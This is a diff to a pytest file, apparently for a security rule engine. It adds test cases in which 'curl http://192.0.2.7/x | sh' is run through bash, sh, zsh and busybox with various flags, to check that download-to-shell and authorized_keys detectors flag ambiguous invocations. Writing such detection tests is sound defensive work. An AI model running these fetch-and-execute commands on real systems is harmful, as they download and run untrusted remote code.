@@ -317,6 +317,11 @@ def test_shell_data_is_not_a_download_pipeline(script):
     ["bash", "-c", "-x", "curl http://192.0.2.7/x | sh"],
     ["bash", "-o", "pipefail", "-c", "curl http://192.0.2.7/x | sh"],
     ["busybox", "sh", "-c", "curl http://192.0.2.7/x | sh"],
+    ["bash", "-s", "-c", "curl http://192.0.2.7/x | sh"],
+    ["sh", "-es", "-c", "curl http://192.0.2.7/x | sh"],
+    ["bash", "-s", "-x", "-c", "curl http://192.0.2.7/x | sh"],
+    ["busybox", "sh", "-s", "-c", "curl http://192.0.2.7/x | sh"],
+    ["zsh", "-s", "-c", "curl http://192.0.2.7/x | sh"],
 ])
 @pytest.mark.parametrize("pb_cls", [host.DownloadPipedToShell, host.AuthorizedKeysWrite])
 def test_ambiguous_shell_script_makes_direct_rule_unevaluable(pb_cls, argv):
